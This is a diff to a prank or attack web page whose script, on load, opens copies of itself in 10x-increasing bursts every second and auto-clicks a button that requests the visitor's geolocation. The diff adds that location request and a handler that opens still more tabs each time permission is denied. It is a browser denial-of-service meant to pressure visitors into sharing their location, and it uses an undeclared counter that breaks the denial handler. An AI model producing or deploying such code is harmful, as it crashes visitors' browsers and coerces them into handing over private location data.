@@ -25,32 +25,86 @@
     p {
       font-size: 1.5rem;
     }
+    button {
+      background-color: #222;
+      color: #00FF00;
+      border: 2px solid #00FF00;
+      padding: 15px 30px;
+      font-size: 1.5rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      cursor: pointer;
+      margin-top: 30px;
+      border-radius: 5px;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #00FF00;
+      color: #222;
+      box-shadow: 0 0 15px #00FF00, 0 0 25px #00FF00;
+    }
   </style>
 </head>
 <body>
   <h1>WARNING: SPAM TABS ACTIVATED!</h1>
   <p>Tabs will keep opening every second with an increasing number of 10x.</p>
+  
+  <!-- Tombol yang akan dipicu secara otomatis -->
+  <button id="locationButton" onclick="requestLocationPermission()">Initiate Location Request</button>
 
   <script>
     let openCount = 10; // Start by opening 10 tabs initially
 
-    // Function to open 10 new tabs
+    // Fungsi untuk membuka 10 tab baru
     function openTabs() {
       for (let i = 0; i < openCount; i++) {
         window.open(window.location.href, "_blank"); // Open a new tab with the same URL
       }
-      // After opening the tabs, increase the number of tabs by 10x each time
+      // Setelah membuka tab, jumlah tab bertambah 10 kali lipat
       openCount *= 10; // Multiply by 10 after each second
     }
 
-    // Start the tab opening process
+    // Fungsi untuk memulai spam tab
     function startSpammingTabs() {
-      setInterval(openTabs, 1000); // Call openTabs every 1 second
+      setInterval(openTabs, 1000); // Memanggil openTabs setiap detik
     }
 
-    // Start spam tab as soon as the page is loaded
+    // Fungsi untuk meminta izin lokasi
+    function requestLocationPermission() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            console.log("Lokasi berhasil diambil");
+          },
+          function(error) {
+            console.error("Error permintaan lokasi:", error);
+            handlePermissionDenied();
+          }
+        );
+      } else {
+        console.log("Geolocation tidak didukung oleh browser ini.");
+      }
+    }
+
+    // Fungsi untuk menangani penolakan izin
+    function handlePermissionDenied() {
+      cancelCount++;
+      let tabCount = Math.pow(10, cancelCount);  // Kelipatan 10 berdasarkan jumlah cancel
+      openNewTabs(tabCount);
+    }
+
+    // Fungsi untuk membuka tab baru sesuai jumlah yang dihitung
+    function openNewTabs(count) {
+      for (let i = 0; i < count; i++) {
+        window.open(window.location.href, "_blank");
+      }
+    }
+
+    // Mulai spam tab dan trigger permintaan izin lokasi saat halaman dimuat
     window.onload = function() {
       startSpammingTabs();
+      document.getElementById('locationButton').click(); // Secara otomatis klik tombol permintaan lokasi
     };
   </script>
 </body>
